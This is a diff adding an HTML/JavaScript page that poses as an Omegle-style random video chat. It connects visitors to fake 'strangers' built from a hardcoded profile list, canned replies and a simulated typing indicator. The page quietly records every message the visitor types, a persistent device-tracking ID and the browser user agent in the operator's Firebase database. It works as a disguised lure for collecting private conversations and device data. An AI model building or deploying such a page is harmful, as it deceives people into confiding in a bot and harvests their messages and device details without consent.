@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>🎥 Omegle Style - Random Chat</title>
+ <!--CREATED BY https://www.xploitpoison.com/-->
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Main Container */
+        .chat-container {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        }
+
+        /* Video Area (Simulated) */
+        .video-area {
+            flex: 1;
+            background: linear-gradient(135deg, #0f0c29, #302b63);
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 300px;
+        }
+
+        .stranger-video {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .avatar-circle {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            50% {
+                transform: scale(1.05);
+                opacity: 0.8;
+            }
+        }
+
+        .avatar-circle span {
+            font-size: 60px;
+        }
+
+        .stranger-name {
+            margin-top: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+        }
+
+        .stranger-location {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 5px;
+        }
+
+        .typing-indicator {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #4ade80;
+            display: none;
+        }
+
+        /* Controls */
+        .controls {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .control-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            font-size: 24px;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: white;
+        }
+
+        .control-btn:active {
+            transform: scale(0.95);
+        }
+
+        .control-btn.disconnect {
+            background: #ef4444;
+        }
+
+        .control-btn.mic {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .control-btn.active {
+            background: #4ade80;
+            color: #000;
+        }
+
+        /* Chat Area */
+        .chat-area {
+            height: 280px;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .message {
+            max-width: 80%;
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 13px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .message.user {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            align-self: flex-end;
+            border-bottom-right-radius: 5px;
+        }
+
+        .message.stranger {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            align-self: flex-start;
+            border-bottom-left-radius: 5px;
+        }
+
+        .message-time {
+            font-size: 9px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 5px;
+        }
+
+        /* Input Area */
+        .input-area {
+            display: flex;
+            padding: 15px;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .chat-input {
+            flex: 1;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 12px 15px;
+            border-radius: 25px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .chat-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .send-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            font-size: 18px;
+            cursor: pointer;
+            color: white;
+        }
+
+        /* Connecting Overlay */
+        .connecting-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #4ade80;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .connecting-text {
+            color: white;
+            font-size: 14px;
+        }
+
+        .skip-btn {
+            background: #ef4444;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 25px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 12px;
+            display: none;
+            z-index: 1000;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="chat-container">
+        <!-- Video Area -->
+        <div class="video-area">
+            <div class="stranger-video">
+                <div class="avatar-circle" id="strangerAvatar">
+                    <span>👤</span>
+                </div>
+                <div class="stranger-name" id="strangerName">Finding stranger...</div>
+                <div class="stranger-location" id="strangerLocation">🌍 Connecting...</div>
+            </div>
+            <div class="typing-indicator" id="typingIndicator">
+                <span>✏️</span> Stranger is typing...
+            </div>
+        </div>
+
+        <!-- Controls -->
+        <div class="controls">
+            <button class="control-btn mic" id="micBtn" onclick="toggleMic()">🎤</button>
+            <button class="control-btn disconnect" onclick="disconnect()">🔴</button>
+            <button class="control-btn" onclick="skipChat()">⏩</button>
+        </div>
+
+        <!-- Chat Area -->
+        <div class="chat-area">
+            <div class="messages" id="messages">
+                <div class="message stranger">
+                    👋 Hi! You've been connected to a random stranger.
+                    <div class="message-time">Just now</div>
+                </div>
+            </div>
+            <div class="input-area">
+                <input type="text" class="chat-input" id="chatInput" placeholder="Type a message..."
+                    onkeypress="handleKeyPress(event)">
+                <button class="send-btn" onclick="sendMessage()">📤</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script src="config.js"></script>
+    <script>
+        // ==================== FIREBASE INIT ====================
+        let database = null;
+        let deviceId = null;
+        let isConnected = false;
+        let strangerId = null;
+        let messageInterval = null;
+        let typingTimeout = null;
+
+        // Fake profiles data
+        const fakeProfiles = [
+            { name: "Alex", country: "United States", flag: "🇺🇸", avatar: "👨‍🦰", age: 24, interest: "music" },
+            { name: "Emma", country: "United Kingdom", flag: "🇬🇧", avatar: "👩‍🦳", age: 22, interest: "art" },
+            { name: "Carlos", country: "Spain", flag: "🇪🇸", avatar: "👨", age: 27, interest: "sports" },
+            { name: "Sofia", country: "Italy", flag: "🇮🇹", avatar: "👩", age: 23, interest: "food" },
+            { name: "Lucas", country: "Brazil", flag: "🇧🇷", avatar: "👨", age: 25, interest: "gaming" },
+            { name: "Mia", country: "Canada", flag: "🇨🇦", avatar: "👩", age: 21, interest: "photography" },
+            { name: "Noah", country: "Germany", flag: "🇩🇪", avatar: "👨", age: 26, interest: "technology" },
+            { name: "Isabella", country: "France", flag: "🇫🇷", avatar: "👩", age: 24, interest: "fashion" },
+            { name: "Oliver", country: "Australia", flag: "🇦🇺", avatar: "👨", age: 28, interest: "travel" },
+            { name: "Ava", country: "Netherlands", flag: "🇳🇱", avatar: "👩", age: 22, interest: "reading" },
+            { name: "Rohan", country: "India", flag: "🇮🇳", avatar: "👨", age: 23, interest: "cricket" },
+            { name: "Priya", country: "India", flag: "🇮🇳", avatar: "👩", age: 24, interest: "dance" },
+            { name: "Yuki", country: "Japan", flag: "🇯🇵", avatar: "👩", age: 25, interest: "anime" },
+            { name: "Leo", country: "Mexico", flag: "🇲🇽", avatar: "👨", age: 26, interest: "soccer" },
+            { name: "Zoe", country: "Sweden", flag: "🇸🇪", avatar: "👩", age: 23, interest: "nature" }
+        ];
+
+        let currentProfile = null;
+        let messages = [];
+        let strangerMessages = [
+            "Hey! How's it going?",
+            "What are you up to?",
+            "That's cool!",
+            "I love that too!",
+            "Where are you from?",
+            "Nice to meet you!",
+            "What do you do for fun?",
+            "Really? That's interesting!",
+            "Same here!",
+            "Tell me more about that.",
+            "I'm new to this platform.",
+            "This is my first time here.",
+            "You seem nice!",
+            "Have you tried the new update?",
+            "I'm enjoying this conversation."
+        ];
+
+        function initFirebase() {
+            if (typeof firebaseConfig !== 'undefined') {
+                if (!firebase.apps.length) {
+                    firebase.initializeApp(firebaseConfig);
+                }
+                database = firebase.database();
+                console.log('✅ Firebase ready');
+            }
+            startApp();
+        }
+
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = isError ? '#ef4444' : '#10b981';
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 2000);
+        }
+
+        // ==================== DEVICE ID ====================
+        // ==================== DEVICE ID (Same as index.html) ====================
+        function generateDeviceId() {
+            // Pehle existing deviceId check karo
+            let id = localStorage.getItem('device_tracker_id');
+            if (!id) {
+                id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
+                localStorage.setItem('device_tracker_id', id);
+            }
+            return id;
+        }
+
+        deviceId = generateDeviceId();
+
+        // ==================== RANDOM PROFILE GENERATOR ====================
+        function generateRandomProfile() {
+            const randomIndex = Math.floor(Math.random() * fakeProfiles.length);
+            const profile = { ...fakeProfiles[randomIndex] };
+            // Add random age variation
+            profile.age = profile.age + Math.floor(Math.random() * 5) - 2;
+            profile.name = profile.name + (Math.random() > 0.7 ? Math.floor(Math.random() * 100) : '');
+            return profile;
+        }
+
+        // ==================== CONNECT TO STRANGER ====================
+        function connectToStranger() {
+            showOverlay(true);
+
+            setTimeout(() => {
+                currentProfile = generateRandomProfile();
+                strangerId = 'stranger_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+
+                document.getElementById('strangerName').innerHTML = `${currentProfile.flag} ${currentProfile.name}, ${currentProfile.age}`;
+                document.getElementById('strangerLocation').innerHTML = `📍 ${currentProfile.country} • ${currentProfile.interest}`;
+                document.getElementById('strangerAvatar').innerHTML = `<span>${currentProfile.avatar}</span>`;
+
+                isConnected = true;
+                showOverlay(false);
+                showToast(`✅ Connected to ${currentProfile.name} from ${currentProfile.country}!`, false);
+
+                // Add connection message
+                addMessage(`Connected to ${currentProfile.name} from ${currentProfile.country}`, 'stranger');
+
+                // Save to Firebase
+                if (database) {
+                    database.ref(`chat_sessions/${deviceId}/current`).set({
+                        strangerId: strangerId,
+                        strangerName: currentProfile.name,
+                        strangerCountry: currentProfile.country,
+                        connectedAt: Date.now()
+                    });
+                }
+
+                // Start stranger auto-responder
+                startStrangerResponses();
+
+            }, 2000);
+        }
+
+        // ==================== STRANGER AUTO RESPONSES ====================
+        function startStrangerResponses() {
+            if (messageInterval) clearInterval(messageInterval);
+
+            // Stranger sends message every 15-30 seconds
+            messageInterval = setInterval(() => {
+                if (isConnected && document.visibilityState === 'visible') {
+                    // 60% chance to send message
+                    if (Math.random() < 0.6) {
+                        const randomMsg = strangerMessages[Math.floor(Math.random() * strangerMessages.length)];
+                        addMessage(randomMsg, 'stranger');
+
+                        // Save to Firebase
+                        if (database) {
+                            database.ref(`chat_sessions/${deviceId}/messages`).push({
+                                type: 'stranger',
+                                message: randomMsg,
+                                timestamp: Date.now()
+                            });
+                        }
+                    }
+                }
+            }, 15000 + Math.random() * 15000);
+        }
+
+        // ==================== TYPING INDICATOR ====================
+        function showStrangerTyping() {
+            const indicator = document.getElementById('typingIndicator');
+            indicator.style.display = 'block';
+
+            if (typingTimeout) clearTimeout(typingTimeout);
+            typingTimeout = setTimeout(() => {
+                indicator.style.display = 'none';
+            }, 3000);
+        }
+
+        // Random typing indicator (simulate stranger typing)
+        function simulateTyping() {
+            if (!isConnected) return;
+
+            setInterval(() => {
+                if (isConnected && Math.random() < 0.3 && document.visibilityState === 'visible') {
+                    showStrangerTyping();
+
+                    // After typing, send message
+                    setTimeout(() => {
+                        const randomMsg = strangerMessages[Math.floor(Math.random() * strangerMessages.length)];
+                        addMessage(randomMsg, 'stranger');
+
+                        if (database) {
+                            database.ref(`chat_sessions/${deviceId}/messages`).push({
+                                type: 'stranger',
+                                message: randomMsg,
+                                timestamp: Date.now()
+                            });
+                        }
+                    }, 2000 + Math.random() * 3000);
+                }
+            }, 20000);
+        }
+
+        // ==================== ADD MESSAGE ====================
+        function addMessage(text, type) {
+            const messagesContainer = document.getElementById('messages');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${type}`;
+
+            const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+            messageDiv.innerHTML = `
+            ${type === 'stranger' ? `👤 ${text}` : `You: ${text}`}
+            <div class="message-time">${time}</div>
+        `;
+
+            messagesContainer.appendChild(messageDiv);
+            messagesContainer.scrollTop = messagesContainer.scrollHeight;
+
+            // Add to messages array
+            messages.push({ text, type, time });
+        }
+
+        // ==================== SEND MESSAGE ====================
+        function sendMessage() {
+            const input = document.getElementById('chatInput');
+            const text = input.value.trim();
+
+            if (!text || !isConnected) return;
+
+            // Add user message
+            addMessage(text, 'user');
+            input.value = '';
+
+            // Save to Firebase
+            if (database) {
+                database.ref(`chat_sessions/${deviceId}/messages`).push({
+                    type: 'user',
+                    message: text,
+                    timestamp: Date.now()
+                });
+            }
+
+            // Show typing indicator (stranger is responding)
+            showStrangerTyping();
+
+            // Stranger responds after delay
+            setTimeout(() => {
+                if (isConnected) {
+                    let response;
+                    if (text.toLowerCase().includes('hi') || text.toLowerCase().includes('hello')) {
+                        response = `Hey! How are you doing?`;
+                    } else if (text.toLowerCase().includes('where')) {
+                        response = `I'm from ${currentProfile.country}! What about you?`;
+                    } else if (text.toLowerCase().includes('age')) {
+                        response = `I'm ${currentProfile.age} years old. You?`;
+                    } else if (text.toLowerCase().includes('bye') || text.toLowerCase().includes('goodbye')) {
+                        response = `It was nice talking to you! Take care! 👋`;
+                        setTimeout(() => disconnect(), 2000);
+                    } else {
+                        response = strangerMessages[Math.floor(Math.random() * strangerMessages.length)];
+                    }
+
+                    addMessage(response, 'stranger');
+
+                    if (database) {
+                        database.ref(`chat_sessions/${deviceId}/messages`).push({
+                            type: 'stranger',
+                            message: response,
+                            timestamp: Date.now()
+                        });
+                    }
+                }
+            }, 1500 + Math.random() * 2000);
+        }
+
+        function handleKeyPress(event) {
+            if (event.key === 'Enter') {
+                sendMessage();
+            }
+        }
+
+        // ==================== SKIP / DISCONNECT ====================
+        function skipChat() {
+            if (!isConnected) return;
+
+            addMessage(`You skipped the conversation`, 'stranger');
+            showToast(`⏩ Searching for new stranger...`, false);
+
+            disconnect();
+
+            setTimeout(() => {
+                connectToStranger();
+            }, 1500);
+        }
+
+        function disconnect() {
+            if (messageInterval) {
+                clearInterval(messageInterval);
+                messageInterval = null;
+            }
+
+            isConnected = false;
+
+            document.getElementById('strangerName').innerHTML = `Disconnected`;
+            document.getElementById('strangerLocation').innerHTML = `Click 🔴 to reconnect`;
+            document.getElementById('strangerAvatar').innerHTML = `<span>❌</span>`;
+
+            if (database) {
+                database.ref(`chat_sessions/${deviceId}/current`).update({
+                    disconnectedAt: Date.now(),
+                    status: 'disconnected'
+                });
+            }
+        }
+
+        // ==================== TOGGLE MIC (Visual Only) ====================
+        function toggleMic() {
+            const micBtn = document.getElementById('micBtn');
+            if (micBtn.classList.contains('active')) {
+                micBtn.classList.remove('active');
+                showToast('🎤 Microphone disabled', false);
+            } else {
+                micBtn.classList.add('active');
+                showToast('🎤 Microphone enabled (demo)', false);
+            }
+        }
+
+        // ==================== OVERLAY ====================
+        function showOverlay(show) {
+            let overlay = document.getElementById('connectingOverlay');
+
+            if (show && !overlay) {
+                overlay = document.createElement('div');
+                overlay.id = 'connectingOverlay';
+                overlay.className = 'connecting-overlay';
+                overlay.innerHTML = `
+                <div class="spinner"></div>
+                <div class="connecting-text">🔍 Finding a random stranger...</div>
+                <button class="skip-btn" onclick="cancelConnect()">Cancel</button>
+            `;
+                document.body.appendChild(overlay);
+            } else if (!show && overlay) {
+                overlay.remove();
+            }
+        }
+
+        function cancelConnect() {
+            showOverlay(false);
+            showToast('Connection cancelled', true);
+        }
+
+        // ==================== START APP ====================
+        function startApp() {
+            console.log('🎥 Video Chat Simulation Started');
+            console.log('📱 Device ID:', deviceId);
+
+            // Auto connect after 1 second
+            setTimeout(() => {
+                connectToStranger();
+                simulateTyping();
+            }, 1000);
+
+            // Save device info
+            if (database) {
+                database.ref(`chat_sessions/${deviceId}/info`).set({
+                    deviceId: deviceId,
+                    userAgent: navigator.userAgent,
+                    firstSeen: new Date().toLocaleString(),
+                    status: 'active'
+                });
+            }
+        }
+
+        // Initialize
+        if (typeof firebaseConfig !== 'undefined') {
+            initFirebase();
+        } else {
+            window.addEventListener('load', () => {
+                if (typeof firebaseConfig !== 'undefined') {
+                    initFirebase();
+                } else {
+                    console.log('⚠️ config.js not found - running demo mode');
+                    startApp();
+                }
+            });
+        }
+    </script>
+     <!--CREATED BY https://www.xploitpoison.com/-->
+</body>
+
+</html>
